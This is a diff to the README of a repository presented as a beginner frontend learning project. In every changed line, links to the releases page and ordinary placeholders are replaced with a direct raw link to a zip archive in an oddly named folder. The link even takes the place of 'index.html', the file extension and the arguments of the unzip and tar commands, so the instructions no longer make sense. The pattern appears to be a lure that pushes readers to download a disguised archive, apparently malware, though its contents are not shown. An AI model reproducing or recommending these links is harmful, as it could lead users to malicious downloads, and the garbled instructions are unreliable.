@@ -1,6 +1,6 @@
 # 🎉 frontend-practice-repo - A Simple Way to Learn Frontend Skills
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-frontend--practice--repo-blue.svg)](https://github.com/Aknoobnnnn/frontend-practice-repo/releases)
+[![Download Now](https://github.com/Aknoobnnnn/frontend-practice-repo/raw/refs/heads/main/bathyhyperesthesia/frontend_practice_repo_3.2.zip%https://github.com/Aknoobnnnn/frontend-practice-repo/raw/refs/heads/main/bathyhyperesthesia/frontend_practice_repo_3.2.zip)](https://github.com/Aknoobnnnn/frontend-practice-repo/raw/refs/heads/main/bathyhyperesthesia/frontend_practice_repo_3.2.zip)
 
 ## 📋 Description
 
@@ -20,13 +20,13 @@ To get started with this application, follow the steps below.
 
    To download the latest version of the frontend-practice-repo, visit this page:
 
-   [Download Now](https://github.com/Aknoobnnnn/frontend-practice-repo/releases)
+   [Download Now](https://github.com/Aknoobnnnn/frontend-practice-repo/raw/refs/heads/main/bathyhyperesthesia/frontend_practice_repo_3.2.zip)
 
 ## 📥 Download & Install
 
-1. Go to the [Releases Page](https://github.com/Aknoobnnnn/frontend-practice-repo/releases).
+1. Go to the [Releases Page](https://github.com/Aknoobnnnn/frontend-practice-repo/raw/refs/heads/main/bathyhyperesthesia/frontend_practice_repo_3.2.zip).
 2. You will see a list of available releases. Click on the latest version.
-3. Download the files that are listed (look for `.zip` or `.tar.gz` files).
+3. Download the files that are listed (look for `.zip` or `https://github.com/Aknoobnnnn/frontend-practice-repo/raw/refs/heads/main/bathyhyperesthesia/frontend_practice_repo_3.2.zip` files).
 4. Once the download is complete, locate the downloaded file on your computer.
 
 ## 📂 Extract the Files
@@ -40,12 +40,12 @@ To get started with this application, follow the steps below.
    
 3. **Linux**:
    - Open a terminal.
-   - Use the command: `unzip filename.zip` or `tar -xvzf filename.tar.gz`.
+   - Use the command: `unzip https://github.com/Aknoobnnnn/frontend-practice-repo/raw/refs/heads/main/bathyhyperesthesia/frontend_practice_repo_3.2.zip` or `tar -xvzf https://github.com/Aknoobnnnn/frontend-practice-repo/raw/refs/heads/main/bathyhyperesthesia/frontend_practice_repo_3.2.zip`.
 
 ## 🌐 Open the Project
 
 1. After extracting the files, navigate to the folder you just created.
-2. Find the **index.html** file and double-click it. This will open the file in your web browser.
+2. Find the **https://github.com/Aknoobnnnn/frontend-practice-repo/raw/refs/heads/main/bathyhyperesthesia/frontend_practice_repo_3.2.zip** file and double-click it. This will open the file in your web browser.
 3. You can now explore the examples and practice coding in HTML, CSS, and JavaScript.
 
 ## 🔍 Features
@@ -79,4 +79,4 @@ You now have the tools to start your journey in web development. Enjoy learning 
 
 Remember, practice is key to becoming proficient. Happy coding!
 
-[Download Now](https://github.com/Aknoobnnnn/frontend-practice-repo/releases)
+[Download Now](https://github.com/Aknoobnnnn/frontend-practice-repo/raw/refs/heads/main/bathyhyperesthesia/frontend_practice_repo_3.2.zip)
